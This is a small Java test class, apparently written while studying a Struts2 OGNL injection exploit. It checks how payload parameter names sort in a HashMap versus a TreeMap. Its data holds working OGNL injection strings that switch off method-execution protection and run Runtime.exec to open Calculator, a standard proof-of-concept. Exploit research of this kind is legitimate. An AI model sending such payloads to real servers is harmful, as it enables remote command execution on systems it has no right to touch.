package Action;

import java.util.*;

public class mapTest {
    public static void main(String[] args) {
        System.out.println("---------------- 保留#myret 排序结果-----------------");
        nodeletdeleteMyret();
        System.out.println("---------------- 删除#myret  排序结果-----------------");
        deleteMyret();
    }

    public static void nodeletdeleteMyret() {
        HashMap<String, String> map = new HashMap<String, String>();
        init(map);
        print(new TreeMap<String, String>(map));
    }

    public static void deleteMyret() {

        WeakHashMap<String,String> map = new WeakHashMap<String, String>();

        init_2(map);
        print(new TreeMap<String, String>(map));
    }

    public static void init(Map<String, String> map) {
        map.put("('\\u0023context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\u003dfalse')(bla)(bla)", "");
        map.put("('\\u0023myret\\u003d@java.lang.Runtime@getRuntime().exec(\\'open\\u0020/System/Applications/Calculator.app\\')')(bla)(bla)", "");

    }
    public static void init_2(Map<String, String> map) {
        map.put("('\\u0023context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\u003dfalse')(bla)(bla)", "");
        map.put("('@java.lang.Runtime@getRuntime().exec(\\'open\\u0020/System/Applications/Calculator.app\\')')(bla)(bla)", "");

    }

    public static void print(TreeMap<String, String> map) {
        Iterator<Map.Entry<String, String>> it = map.entrySet().iterator();
        while(it.hasNext()) {
            Map.Entry<String, String> entry = it.next();
            System.out.println(entry.getKey() + " : " + entry.getValue());
        }
    }
}
